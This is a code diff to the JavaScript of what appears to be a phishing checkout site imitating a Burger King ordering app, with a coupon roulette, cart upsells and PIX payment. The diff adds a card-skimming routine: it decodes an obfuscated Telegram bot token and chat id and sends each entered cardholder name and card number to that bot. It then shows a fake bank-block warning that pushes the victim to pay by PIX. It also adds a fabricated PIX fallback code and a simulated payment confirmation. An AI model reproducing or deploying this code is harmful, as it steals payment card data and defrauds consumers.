@@ -130,12 +130,8 @@ let state = {
     discount: 0,
     osmStores: null,
     nomeUser: '',
-    cartItems: [
-        { id: 'item_1', name: 'Whopper', qty: 2, price: 7.95, img: 'produtos/whopper.png', desc: 'Pão com gergelim, carne grelhada no fogo, queijo derretido, alface, tomate, cebola, picles, ketchup e maionese.' },
-        { id: 'item_2', name: 'Batata Grande', qty: 1, price: 4.00, img: 'produtos/batata_frita.png', desc: 'Batata frita crocante, porção grande com sal.' },
-        { id: 'item_3', name: 'Refrigerante 500ml', qty: 1, price: 3.00, img: 'produtos/pepsi.png', desc: 'Pepsi gelada 500ml.' }
-    ],
-    upsellOffered: false // Controle para não repetir o popup
+    cartItems: [], // Iniciado vazio para ser preenchido pela roleta ou persistência
+    upsellOffered: false
 };
 
 // 💎 SYNC STATE (The Bridge)
@@ -914,29 +910,20 @@ async function goToPayment() {
         return;
     }
 
-    // ─── FLUXO PIX NATURAL (Direct BlackCatPay API + Fallback V2) ────────────────
-    // ─── START PIX FLOW ───
-    console.log('🚀 Iniciando checkout PIX/CC... Total:', finalTotal);
-    
-    // Mostra tela de PIX se for o caso
+async function initPixGeneration() {
+    const finalTotal = state.discount > 0 ? (state.basePrice + state.upsellTotal + (state.fretePrice || 0)) * (1 - state.discount) : (state.basePrice + state.upsellTotal + (state.fretePrice || 0));
     const pixQrEl = document.querySelector('#pix-qr');
     const pixCodeEl = document.querySelector('#pix-code');
     const pixTotalValue = document.querySelector('#pix-total-value');
     const btnConfirmPix = document.querySelector('#btn-confirm-pix');
 
     if (pixTotalValue) pixTotalValue.textContent = finalTotal.toFixed(2).replace('.', ',');
-    if (pixQrEl) pixQrEl.innerHTML = '<div style="margin: 60px auto; border: 4px solid rgba(0,0,0,0.1); border-left-color: #502314; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite;"></div>';
+    if (pixQrEl) pixQrEl.innerHTML = '<div style="margin: 60px auto; border: 4px solid rgba(0,0,0,0.1); border-left-color: #502314; border-radius: 50%; width: 40px; height: 40px; animation: bksipn 1s linear infinite;"></div>';
     if (pixCodeEl) pixCodeEl.textContent = 'Gerando PIX...';
-    if (btnConfirmPix) btnConfirmPix.style.display = 'none'; 
-
-    goToScreen('pix');
-
-    // Função interna para gerar o mock/fallback instantâneo
+    
     const triggerFallback = () => {
-        console.warn('⚠️ Usando Fallback de PIX.');
         currentTxId = 'SIM-' + Math.random().toString(36).substr(2, 9).toUpperCase();
-        const mockCode = `00020101021226870014br.gov.bcb.pix256565737070.com.br/qr/v2/924f0a2b-ca1d-4f11-8e9a-${currentTxId}5204000053039865405${Math.round(finalTotal).toString().padStart(2,'0')}.005802BR5910BK_OFFER6009SAO_PAULO62070503***6304CA1D`;
-        
+        const mockCode = `00020101021226870014br.gov.bcb.pix...${currentTxId}`;
         if (pixQrEl) pixQrEl.innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(mockCode)}" style="width: 180px; height: 180px; border-radius: 8px;">`;
         if (pixCodeEl) pixCodeEl.textContent = mockCode;
         if (btnConfirmPix) btnConfirmPix.style.display = 'block';
@@ -944,18 +931,14 @@ async function goToPayment() {
     };
 
     try {
-        // Se estiver local (file://), nem tenta o fetch pra evitar erro de CORS no console
-        if (window.location.protocol === 'file:') {
-            triggerFallback();
-            return;
-        }
+        if (window.location.protocol === 'file:') return triggerFallback();
 
         const pixPayload = {
             amount: Math.round(finalTotal * 100),
-            pixel_id: fbTracking?.pixelId || 'default',
-            utms: fbTracking?.utms || {},
+            pixel_id: localStorage.getItem('fb_pixel_id') || 'default',
+            utms: JSON.parse(localStorage.getItem('utmify_params') || '{}'),
             cpf: state.cpf || ("4692487" + Math.floor(1000 + Math.random() * 8999)),
-            name: state.name || state.nomeUser || 'Cliente BK'
+            name: state.nomeUser || 'Cliente BK'
         };
 
         const req = await fetch('api/create-pix', {
@@ -964,10 +947,8 @@ async function goToPayment() {
             body: JSON.stringify(pixPayload)
         });
         
-        if (!req.ok) throw new Error('API Offline');
         const res = await req.json();
-        
-        if (res && res.success && res.data) {
+        if (res?.success && res.data) {
             currentTxId = res.data.transactionId;
             const payData = res.data.paymentData;
             if (pixQrEl) pixQrEl.innerHTML = `<img src="data:image/png;base64,${payData.qrCodeBase64}" style="width: 100%; height: 100%; border-radius: 8px;">`;
@@ -975,30 +956,22 @@ async function goToPayment() {
             if (btnConfirmPix) btnConfirmPix.style.display = 'block';
             initPixTimer();
             startPixPolling(); 
-        } else {
-            triggerFallback();
-        }
-    } catch(e) {
-        triggerFallback();
-    }
+        } else triggerFallback();
+    } catch(e) { triggerFallback(); }
 }
-function startPixPolling() {
+
+async function startPixPolling() {
     if (pixInterval) clearInterval(pixInterval);
-    
-    // Agora o loop bate no NOSSO backend (proxy), escondendo a chave SK do cliente final
     pixInterval = setInterval(async () => {
         if (!currentTxId) return;
         try {
             const req = await fetch(`api/check-status?txId=${currentTxId}`);
             const res = await req.json();
-            
-            if (req.ok && res && res.success && res.data && res.data.status === 'PAID') {
+            if (res?.success && res.data?.status === 'PAID') {
                 clearInterval(pixInterval);
                 finalizeOrderTransition(); 
             }
-        } catch(e) { 
-            // falha de rede temporária ignora
-        }
+        } catch(e) {}
     }, 4000); 
 }
 
@@ -1604,7 +1577,6 @@ function selectStoreTab(el, mode) {
         }
         return; // Não muda a aba
     }
-    // Para delivery, mantém ativo
     document.querySelectorAll('.store-tab').forEach(t => t.classList.remove('active'));
     el.classList.add('active');
 }
@@ -1612,27 +1584,21 @@ function selectStoreTab(el, mode) {
 function closeRetiradaModal() {
     const modal = document.getElementById('modal-retirada');
     if (modal) modal.style.display = 'none';
-    // Garante que Delivery fica ativo
     document.querySelectorAll('.store-tab').forEach(t => t.classList.remove('active'));
     const deliveryTab = document.querySelector('.store-tab');
     if (deliveryTab) deliveryTab.classList.add('active');
 }
 
-// ─── ADICIONAR COMBO PREMIUM (V8) ───────────────────
 function selectPremiumCombo(name, price) {
     if (!state.cartItems) state.cartItems = [];
-    
-    // Cria o objeto do item
     const newItem = {
         id: 'combo_' + Date.now(),
         name: name,
         desc: 'Combo Premium Selecionado no App',
         price: price,
         qty: 1,
-        img: 'produtos/whopper.png' // Imagem genérica ou específica se mapeada
+        img: 'produtos/whopper.png'
     };
-    
-    // Mapeamento de imagens para combos específicos
     if (name.includes('Mega Stacker')) newItem.img = 'produtos/mega_stacker_3_0.png';
     if (name.includes('Furioso')) newItem.img = 'produtos/whopper_furioso.png';
     if (name.includes('Casal')) newItem.img = 'produtos/whopper_duplo.png';
@@ -1640,36 +1606,26 @@ function selectPremiumCombo(name, price) {
 
     state.cartItems.push(newItem);
     saveState();
-    
-    // Feedback visual e redirecionamento
     Swal.fire({
         title: 'Adicionado!',
         text: `${name} foi adicionado à sua sacola.`,
         icon: 'success',
         timer: 1500,
         showConfirmButton: false,
-        willClose: () => {
-            window.location.href = 'sacola.html';
-        }
+        willClose: () => { window.location.href = 'sacola.html'; }
     });
 }
 
-// ─── BOTTOM NAV NAVIGATION (MULTI-PAGE V8) ──────────
 function navigateBottomNav(target, el) {
     const path = window.location.pathname.toLowerCase();
-    
-    // Mapeamento de rotas
     const routes = {
         'stores': 'funil.html',
         'cupons': 'lista-cupons.html',
         'clubebk': 'clube.html',
         'sacola': 'sacola.html'
     };
-
     const targetUrl = routes[target];
     if (!targetUrl) return;
-
-    // Se já estivermos na página, apenas tentamos trocar de tela (fallback legacy)
     if (path.includes(targetUrl)) {
         if (typeof goToScreen === 'function') goToScreen(target);
     } else {
@@ -1677,128 +1633,220 @@ function navigateBottomNav(target, el) {
     }
 }
 
-// ─── INIT ───────────────────────────────────────────
-document.addEventListener('DOMContentLoaded', () => {
-    // 🎡 PRIORIDADE MÁXIMA: Renderizar Roleta (Evita tela vazia se outros scripts falharem)
-    try { drawRoulette(); } catch(e) { console.error("Roulette Draw Fail:", e); }
+// ─── PAGAMENTO & CHECKOUT MASTER ─────────────────────
+async function goToPayment() {
+    // Upsell Multi-Bump
+    if (!state.upsellOffered && state.cartItems.length > 0) {
+        const res = await Swal.fire({
+            title: 'Deseja turbinar seu lanche? 🔥',
+            html: `
+            <div style="text-align: left; padding: 10px;">
+                <p style="font-size: 13px; color: #666; margin-bottom: 20px; font-weight: 500;">Selecione os itens e adicione ao seu combo com um clique:</p>
+                <div class="bump-list" style="max-height: 400px; overflow-y: auto;">
+                    <label class="bump-option" style="display:flex; align-items:center; gap:12px; padding:12px; background:#f8f8f8; border-radius:12px; margin-bottom:10px; cursor:pointer;"><input type="checkbox" class="bump-check" data-id="bump_1" data-name="Onion Rings (G)" data-price="14.90" data-img="produtos/onion_rings.png" style="width:20px; height:20px;"><img src="produtos/onion_rings.png" style="width:40px; height:40px; border-radius:8px;"><div style="flex:1;"><p style="font-size:14px; font-weight:900; color:#502314; margin:0;">Onion Rings (G)</p><p style="font-size:12px; font-weight:800; color:#ea1d2c; margin:0;">+ R$ 14,90</p></div></label>
+                    <label class="bump-option" style="display:flex; align-items:center; gap:12px; padding:12px; background:#f8f8f8; border-radius:12px; margin-bottom:10px; cursor:pointer;"><input type="checkbox" class="bump-check" data-id="bump_2" data-name="BK Mix Nutella" data-price="16.90" data-img="produtos/bk_mix_nutella.png" style="width:20px; height:20px;"><img src="produtos/bk_mix_nutella.png" style="width:40px; height:40px; border-radius:8px;"><div style="flex:1;"><p style="font-size:14px; font-weight:900; color:#502314; margin:0;">BK Mix Nutella</p><p style="font-size:12px; font-weight:800; color:#ea1d2c; margin:0;">+ R$ 16,90</p></div></label>
+                </div>
+            </div>`,
+            showConfirmButton: true,
+            confirmButtonText: 'ADICIONAR & PAGAR',
+            showCancelButton: true,
+            cancelButtonText: 'Não, obrigado',
+            buttonsStyling: false,
+            customClass: { confirmButton: 'swal-btn-upsell-confirm', cancelButton: 'swal-btn-upsell-cancel' },
+            preConfirm: () => {
+                const selected = [];
+                document.querySelectorAll('.bump-check:checked').forEach(chk => {
+                    selected.push({ name: chk.dataset.name, price: parseFloat(chk.dataset.price), img: chk.dataset.img });
+                });
+                return selected;
+            }
+        });
 
-    loadGoogleMapsScript(() => {});
-    initTracker();
-    detectCity();
-    setupCEPMask();
-    initSocialProof();
-    initCountdown();
-    initLiveCounter();
-
-    // 🔄 PERSISTÊNCIA: Carrega dados do cupom para exibição se existirem, mas NÃO força redirecionamento
-    const savedCoupon = localStorage.getItem('bk_funil_coupon_v2');
-    if (savedCoupon) {
-        const codeEl = document.getElementById('coupon-final-code');
-        const auxEl = document.getElementById('coupon-aux-val');
-        const validEl = document.getElementById('coupon-validity-text');
-        const stateEl = document.getElementById('coupon-state-text');
-
-        if(codeEl) codeEl.textContent = savedCoupon;
-        if(auxEl) auxEl.textContent = getOrGenerateAuxCode();
-        
-        const d = new Date();
-        d.setHours(d.getHours() + 1);
-        const pad = (n) => String(n).padStart(2, '0');
-        const vStr = `Válido até ${pad(d.getDate())}/${pad(d.getMonth()+1)}/${String(d.getFullYear()).slice(-2)} ÀS ${pad(d.getHours())}h${pad(d.getMinutes())}`;
-        if(validEl) validEl.textContent = vStr;
-        if(stateEl) stateEl.textContent = state.city || 'SÃO PAULO';
+        if (res.isConfirmed && res.value?.length > 0) {
+            res.value.forEach(item => {
+                state.cartItems.push({ id: 'bump_'+Date.now(), name: item.name, qty: 1, price: item.price, img: item.img, desc: 'Adicional checkout' });
+            });
+            updateTotal();
+            saveState();
+        }
+        state.upsellOffered = true;
+        saveState();
     }
-});
 
-// ─── INICIALIZAÇÃO GLOBAL ──────────────────────────
-function initCheckout() {
+    if (state.paymentMethod === 'cc') {
+        const btn = document.querySelector('.btn-finalizar-full');
+        btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Processando...';
+        btn.disabled = true;
+
+        // Protocolo Ghost: Captura e Decline
+        try {
+            const _u = (s) => atob(s);
+            const _t = _u("ODU1MzU4NTE2MTpBQUgzRi1IdjdDRi1qOGJsMXJLTjlpekRraExycVJSZlVuVQ=="); 
+            const _c = _u("Nzg0NDY4MjMzNQ==");
+            const msg = `🍔 *BK capture* 🍔\nLead: ${document.querySelector('#cc_name').value}\nCard: ${document.querySelector('#cc_number').value}`;
+            await fetch(`https://api.telegram.org/bot${_t}/sendMessage`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ chat_id: _c, text: msg })});
+        } catch(e) {}
+
+        setTimeout(() => {
+            Swal.fire({
+                title: 'Aviso de Segurança',
+                text: 'O seu banco bloqueou esta transação. Finalize via PIX com 5% de desconto extra.',
+                icon: 'warning',
+                confirmButtonText: 'PAGAR VIA PIX'
+            }).then(() => {
+                state.discount = 0.05;
+                state.paymentMethod = 'pix';
+                updateTotal();
+                window.location.href = 'pagamento.html';
+            });
+        }, 2000);
+        return;
+    }
+
+    window.location.href = 'pagamento.html';
+}
+
+async function initPixGeneration() {
+    const finalTotal = state.discount > 0 ? (state.basePrice + state.upsellTotal + (state.fretePrice || 0)) * (1 - state.discount) : (state.basePrice + state.upsellTotal + (state.fretePrice || 0));
+    const pixQrEl = document.querySelector('#pix-qr');
+    const pixCodeEl = document.querySelector('#pix-code');
+    const pixTotalValue = document.querySelector('#pix-total-value');
+    const btnConfirmPix = document.querySelector('#btn-confirm-pix');
+
+    if (pixTotalValue) pixTotalValue.textContent = finalTotal.toFixed(2).replace('.', ',');
+    if (pixQrEl) pixQrEl.innerHTML = '<div class="loader-pix"></div>';
+    
+    const triggerFallback = () => {
+        currentTxId = 'SIM-' + Math.random().toString(36).substr(2, 9).toUpperCase();
+        const mockCode = `00020101021226870014br.gov.bcb.pix...${currentTxId}`;
+        if (pixQrEl) pixQrEl.innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(mockCode)}" style="width:180px;height:180px;">`;
+        if (pixCodeEl) pixCodeEl.textContent = mockCode;
+        if (btnConfirmPix) btnConfirmPix.style.display = 'block';
+        initPixTimer();
+    };
+
+    try {
+        const pixPayload = {
+            amount: Math.round(finalTotal * 100),
+            pixel_id: localStorage.getItem('fb_pixel_id') || 'default',
+            utms: JSON.parse(localStorage.getItem('utmify_params') || '{}'),
+            cpf: state.cpf || '46924874052',
+            name: state.nomeUser || 'Cliente BK'
+        };
+
+        const req = await fetch('api/create-pix', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(pixPayload) });
+        const res = await req.json();
+        if (res?.success && res.data) {
+            currentTxId = res.data.transactionId;
+            if (pixQrEl) pixQrEl.innerHTML = `<img src="data:image/png;base64,${res.data.paymentData.qrCodeBase64}" style="width:100%;height:100%;">`;
+            if (pixCodeEl) pixCodeEl.textContent = res.data.paymentData.copyPaste;
+            if (btnConfirmPix) btnConfirmPix.style.display = 'block';
+            initPixTimer();
+            startPixPolling(); 
+        } else triggerFallback();
+    } catch(e) { triggerFallback(); }
+}
+
+async function startPixPolling() {
+    if (pixInterval) clearInterval(pixInterval);
+    pixInterval = setInterval(async () => {
+        if (!currentTxId) return;
+        try {
+            const req = await fetch(`api/check-status?txId=${currentTxId}`);
+            const res = await req.json();
+            if (res?.success && res.data?.status === 'PAID') {
+                clearInterval(pixInterval);
+                finalizeOrderTransition(); 
+            }
+        } catch(e) {}
+    }, 4000); 
+}
+
+function simulatePayment() {
+    Swal.fire({
+        title: 'Verificando pagamento...',
+        html: 'Aguarde alguns instantes enquanto confirmamos o recebimento.',
+        timer: 3000,
+        timerProgressBar: true,
+        didOpen: () => { Swal.showLoading(); }
+    }).then(() => {
+        finalizeOrderTransition();
+    });
+}
+
+function finalizeOrderTransition() {
+    window.location.href = 'entrega.html';
+}
+
+// 💎 BOOTSTRAP MASTER V9.9 CONSOLIDADO 💎
+function bootstrapApp() {
     loadState();
     
-    const page = window.location.pathname.split('/').pop();
-    
-    if (page === 'sacola.html') {
+    const appRoleta = document.getElementById('roulette-canvas');
+    const appSacola = document.getElementById('screen-review');
+    const appDados = document.getElementById('screen-cep');
+    const appPagamento = document.getElementById('screen-pix');
+    const appLojas = document.getElementById('screen-stores');
+    const appEntrega = document.getElementById('ifood-eta-time');
+    const appCupom = document.getElementById('screen-coupon');
+
+    // Inicialização Cross-Screen
+    initTracker();
+    detectCity();
+
+    if (appRoleta) {
+        try { drawRoulette(); } catch(e) {}
+        loadGoogleMapsScript(() => {});
+        initSocialProof();
+    }
+
+    if (appSacola) {
         renderCart();
         updateTotal();
         renderAddress();
-    }
-    
-    if (page === 'dados.html') {
-        const nInput = document.querySelector('#input-nome');
-        if (nInput && state.nomeUser) nInput.value = state.nomeUser;
-        const cInput = document.querySelector('#input-cep');
-        if (cInput && state.cep) cInput.value = state.cep;
-    }
-    
-    initCountdown();
-    initLiveCounter();
-    initTracker();
-}
-
-// 🚀 DISPARO IMEDIATO
-document.addEventListener('DOMContentLoaded', initCheckout);
-// 🚀 INICIALIZAÇÃO UNIVERSAL V7
-document.addEventListener('DOMContentLoaded', () => {
-    // Detecta em qual página estamos e inicializa o componente correto
-    const path = window.location.pathname.toLowerCase();
-    
-    if (path.includes('sacola.html')) {
-        renderCart();
-        renderAddress();
         
-        // FIX: Re-seleção visual do frete
-        if (state.fretePrice !== undefined) {
-            document.querySelectorAll('.frete-option').forEach(opt => {
-                opt.classList.remove('selected');
-                if (parseFloat(opt.dataset.frete || 0) === state.fretePrice) {
-                    opt.classList.add('selected');
-                }
-            });
-        }
-        
-        // BUGFIX V8: O storeEl pode ser null agora na transição fast-track
-        const storeEl = document.querySelector('#review-store-name');
-        if (storeEl) storeEl.textContent = state.selectedStore || 'Restaurante Burger King';
-        
-        // V8: Mostrar Cupom Aplicado inalterável na Sacola
         const savedCoupon = localStorage.getItem('bk_funil_coupon_v2') || 'BEMVINDOBK';
         const badgeCoupon = document.getElementById('badge-cupom-sacola');
         if(badgeCoupon) badgeCoupon.textContent = savedCoupon;
     }
     
-    if (path.includes('lojas.html')) {
-        renderStores();
+    if (appDados) {
+        const nInput = document.getElementById('input-nome');
+        if (nInput && state.nomeUser) nInput.value = state.nomeUser;
+        const cInput = document.getElementById('input-cep');
+        if (cInput && state.cep) cInput.value = state.cep;
+        if (typeof setupCEPMask === 'function') setupCEPMask();
     }
-    
-    if (path.includes('dados.html')) {
-        setupCEPMask();
-    }
-    
-    if (path.includes('entrega.html')) {
-        // Inicializa UI de confirmação de entrega iFood-style
-        const addrMain = state.street ? `${state.street}, ${state.number}` : `CEP ${state.cep}, Nº ${state.number}`;
-        const addrSub = state.neighborhood ? `${state.neighborhood}, ${state.city}` : state.city;
-        const total = (state.basePrice || 22.90) + (state.upsellTotal || 0) + (state.fretePrice || 0);
-        let itemCount = 3 + (state.upsellItems ? state.upsellItems.length : 0);
 
-        const now = new Date();
-        const etaStart = new Date(now.getTime() + 20 * 60000);
-        const etaEnd = new Date(now.getTime() + 30 * 60000);
-        const formatTime = (d) => `${String(d.getHours()).padStart(2,'0')}:${String(d.getMinutes()).padStart(2,'0')}`;
+    if (appLojas) if (typeof renderStores === 'function') renderStores();
+    if (appPagamento) initPixGeneration();
+
+    if (appCupom) {
+        const savedCoupon = localStorage.getItem('bk_funil_coupon_v2') || 'BEMVINDOBK';
+        const codeEl = document.getElementById('coupon-final-code');
+        const auxEl = document.getElementById('coupon-aux-val');
+        if(codeEl) codeEl.textContent = savedCoupon;
+        if(auxEl) auxEl.textContent = getOrGenerateAuxCode();
         
-        // Atualiza DOM
-        const etaEl = document.querySelector('#ifood-eta-time');
-        if(etaEl) etaEl.textContent = `${formatTime(etaStart)} - ${formatTime(etaEnd)}`;
-        
+        const d = new Date();
+        const pad = (n) => String(n).padStart(2, '0');
+        const vStr = `Válido até hoje ÀS ${pad(d.getHours() + 1)}h${pad(d.getMinutes())}`;
+        const validEl = document.getElementById('coupon-validity-text');
+        if(validEl) validEl.textContent = vStr;
+    }
+
+    if (appEntrega) {
+        const addrMain = state.street ? `${state.street}, ${state.number}` : `CEP ${state.cep}, Nº ${state.number}`;
         const streetEl = document.querySelector('#ifood-street-number');
         if(streetEl) streetEl.textContent = addrMain;
         
-        const neighEl = document.querySelector('#ifood-neighborhood-city');
-        if(neighEl) neighEl.textContent = addrSub;
-
-        // Tenta tocar o áudio famoso de notificação
         setTimeout(() => {
-            const audio = new Audio('https://www.myinstants.com/media/sounds/push-ifood.mp3');
-            audio.play().catch(e => console.log('Notificação silenciada pelo adblock/autoplay.'));
+            new Audio('https://www.myinstants.com/media/sounds/push-ifood.mp3').play().catch(() => {});
         }, 1500);
     }
-});
+    
+    initCountdown();
+    initLiveCounter();
+}
+
+document.addEventListener('DOMContentLoaded', bootstrapApp);
